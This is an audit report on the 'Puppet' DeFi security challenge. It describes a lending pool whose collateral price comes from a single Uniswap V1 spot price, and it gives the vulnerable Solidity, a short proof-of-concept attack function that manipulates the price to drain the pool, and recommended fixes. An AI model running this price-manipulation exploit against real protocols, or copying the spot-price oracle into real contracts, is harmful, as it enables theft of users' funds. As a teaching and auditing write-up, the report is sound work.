---
title: Puppet Audit Report
author: Jack
date: January 12, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Single-source Uniswap V1 spot price oracle can be instantly manipulated to enable zero-cost undercollateralized borrowing

**Description:** `PuppetPool` calculates the required ETH collateral for borrowing DVT tokens using a price oracle that reads the live reserve ratio of a single Uniswap V1 pool:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // ⚠️ Reads spot price directly from single AMM pool
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This is a single-source, real-time spot price with no time-averaging, no secondary source, and no circuit breaker. Any large trade in the Uniswap V1 DVT/ETH pool directly and immediately changes the oracle price. An attacker who holds a large DVT position can dump it into the pool in the same transaction, drive the DVT spot price to near-zero, and then borrow the pool's entire DVT balance for a fraction of the fair collateral.

**Impact:** An attacker can drain the entire DVT lending pool (100,000 DVT in the challenge scenario) by posting minimal ETH collateral. The attack is self-financing: the attacker sells DVT into Uniswap to manipulate price (receiving ETH back), then uses that ETH as collateral to borrow even more DVT.

**Proof of Concept:**

```solidity
function attack() external payable {
    uint256 dvtBalance = token.balanceOf(address(this));

    // 1. Sell all DVT into Uniswap V1, crash the spot price
    token.approve(address(uniswapV1Exchange), dvtBalance);
    uniswapV1Exchange.tokenToEthSwapInput(dvtBalance, 1, block.timestamp);

    // 2. calculateDepositRequired now returns near-zero
    uint256 poolDVT = token.balanceOf(address(lendingPool));
    uint256 depositRequired = lendingPool.calculateDepositRequired(poolDVT);

    // 3. Borrow all pool DVT with manipulated collateral
    lendingPool.borrow{value: depositRequired}(poolDVT, recovery);
}
```

**Recommended Mitigation:**

1. **Use a manipulation-resistant price oracle (recommended):** Replace the spot-price oracle with a Chainlink price feed or a Uniswap V2/V3 TWAP with a sufficiently long window (e.g., 30 minutes).

   ```solidity
   function _computeOraclePrice() private view returns (uint256) {
       // Use Chainlink price feed instead
       (, int256 price,,,) = priceFeed.latestRoundData();
       return uint256(price);
   }
   ```

2. **Aggregate multiple price sources:** Use a median of multiple independent DEX prices and off-chain oracle prices.

3. **Add circuit breakers:** Reject borrows if the oracle price deviates more than a threshold from the moving average, or limit maximum single-block borrowing amounts.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
